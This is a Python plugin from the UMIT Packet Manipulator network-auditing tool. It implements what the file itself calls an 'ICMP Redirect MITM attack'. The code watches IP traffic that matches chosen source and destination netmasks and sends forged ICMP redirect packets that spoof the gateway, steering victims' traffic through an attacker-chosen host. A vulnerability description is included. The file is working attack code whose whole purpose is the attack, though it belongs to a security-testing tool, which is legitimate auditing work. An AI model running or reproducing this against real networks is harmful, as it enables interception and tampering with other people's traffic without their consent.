#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (C) 2008 Adriano Monteiro Marques
#
# Author: Francesco Piccinno <stack.box@gmail.com>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA

import gtk
import gobject

import time

from umit.pm.core.i18n import _
from umit.pm.core.const import STATUS_ERR, STATUS_WARNING, STATUS_INFO
from umit.pm.core.auditutils import AuditOperation, is_ip

from umit.pm.gui.plugins.engine import Plugin
from umit.pm.manager.auditmanager import *

from umit.pm.backend import MetaPacket

AUDIT_NAME = 'icmp-redirect'
AUDIT_MSG = '<tt><b>' + AUDIT_NAME + ':</b> %s</tt>'

class IcmpRedirect(Plugin, ActiveAudit):
    __inputs__ = (
        ('source mask', ('', _('A netmask in the form 0.0.0.0/0'))),
        ('destination mask', ('', _('A netmask in the form 0.0.0.0/0'))),
        ('gateway', ('0.0.0.0', _('IP address of the gateway'))),
        ('spoofed', ('0.0.0.0', _('The IP address of the router with the '
                                  'shortest path. Leave as is to use IP '
                                  'address of your NIC'))),
        ('delay', (300, _('Delay between sends'))),
    )

    def start(self, reader):
        self.active_redirects = []
        a, self.item = self.add_menu_entry('IcmpRedirect', 'ICMP Redirect ...',
                                           _('Start ICMP Redirect MITM attack'),
                                           gtk.STOCK_EXECUTE)

    def register_decoders(self):
        AuditManager().add_decoder_hook(NET_LAYER, LL_TYPE_IP, self._ip_hook)

    def stop(self):
        self.remove_menu_entry(self.item)
        AuditManager().remove_decoder_hook(NET_LAYER, LL_TYPE_IP, self._ip_hook)

    def _ip_hook(self, mpkt):
        if mpkt.flags & MPKT_FORWARDED:
            return

        sip = mpkt.l3_src
        dip = mpkt.l3_dst

        for op in self.active_redirects:
            if ((op.smask and op.smask.match(sip)) or not op.smask) and \
               ((op.dmask and op.dmask.match(dip)) or not op.dmask):

                op.send_redirect(sip, dip)

    def execute_audit(self, sess, inp_dict):
        smask = inp_dict['source mask']
        dmask = inp_dict['destination mask']

        gateway = inp_dict['gateway']
        source = inp_dict['spoofed']

        delay = max(inp_dict['delay'], 100)

        if not is_ip(gateway):
            sess.output_page.user_msg(_('Gateway is not a valid IP address'),
                                      STATUS_ERR, AUDIT_NAME)
            return False

        if not source or (source and (not is_ip(source) or source == '0.0.0.0')):
            source = sess.context.get_ip1()

            sess.output_page.user_msg(_('Source is not a valid IP address. '
                                        'Using IP of your NIC: %s') % source,
                                      STATUS_WARNING, AUDIT_NAME)

        # Check the network mask

        if smask:
            try:
                smask = Netmask(smask)
            except:
                sess.output_page.user_msg(
                    _('Source mask is not a valid netmask'),
                    STATUS_ERR, AUDIT_NAME)
                return False

        if dmask:
            try:
                dmask = Netmask(dmask)
            except:
                sess.output_page.user_msg(
                    _('Destination mask is not a valid netmask'),
                    STATUS_ERR, AUDIT_NAME)
                return False

        return IcmpRedirectOperation(
            smask, dmask, gateway, source, delay, sess, self
        )

class IcmpRedirectOperation(AuditOperation):
    has_stop = True
    has_start = True

    def __init__(self, smask, dmask, gateway, source, delay, session, parent):
        AuditOperation.__init__(self)

        self.smask = smask
        self.dmask = dmask
        self.gateway = gateway
        self.source = source
        self.delay = delay / 1000.0
        self.session = session
        self.parent = parent
        self.packets = 0

        self.connections = {}

    def get_percentage(self):
        return None

    def start(self):
        if self.state == self.RUNNING:
            return False

        self.state = self.RUNNING
        self.parent.active_redirects.append(self)

        self.summary = AUDIT_MSG % _('waiting for packets ...')

        return True

    def stop(self):
        self.summary = AUDIT_MSG % _('stopped')

        self.packets = 0
        self.connections = {}
        self.parent.active_redirects.remove(self)
        self.state = self.NOT_RUNNING

    def send_redirect(self, sip, dip):
        key = sip + ':' + dip

        delay = self.connections.get(key, None)

        if delay and (time.time() - delay) <= self.delay:
            return

        self.connections[key] = time.time()

        pkt = MetaPacket.new('ip') / MetaPacket.new('icmp')

        pkt.set_field('ip.src', self.gateway)
        pkt.set_field('ip.dst', dip)

        pkt.set_field('icmp.type', 5) # Redirect
        pkt.set_field('icmp.code', 0) # Redirect for network
        pkt.set_field('icmp.gw', self.source)

        self.packets += 1
        self.session.context.si_l3(pkt)

        self.session.output_page.user_msg(
            _('%s to %s matches - redirect to %s') % (sip, dip, self.source),
            STATUS_INFO, AUDIT_NAME)

        self.summary = AUDIT_MSG % (_('%d redirects sent') % self.packets)
        self.percentage = (self.percentage + 536870911) % \
                          gobject.G_MAXINT

__plugins__ = [IcmpRedirect]
__plugins_deps__ = [('ICMPRedirect', ['IPDecoder'], ['=ICMPRedirect-1.0'], [])]

__audit_type__ = 1
__protocols__ = (('icmp', None), )
__vulnerabilities__ = (('ICMP redirect', {
    'description' : 'The ICMP type 5 contains a redirect message to send data '
                    'packets on alternative route. ICMP Redirect is a '
                    'mechanism for routers to convey routing information to '
                    'hosts. The Redirect Message is an ICMP message which '
                    'informs a host to redirect its routing information (to '
                    'send packets on an alternate route). If the host tries to '
                    'send data through a router (R1) and R1 sends the data on '
                    'another router (R2) then to reach the host, and a direct '
                    'path from the host to R2 is available, the redirect will '
                    'inform the host of such a route. The router will still '
                    'send the original datagram to the intended destination. '
                    'However, if the datagram contains routing information, '
                    'this message will not be sent even if a better route is '
                    'available. RFC1122 states that redirects should only be '
                    'sent by gateways and should not be sent by Internet '
                    'hosts.',
    'references' : ((None, 'http://en.wikipedia.org/wiki/'
                            'ICMP_Redirect_Message'),)
    }),
)

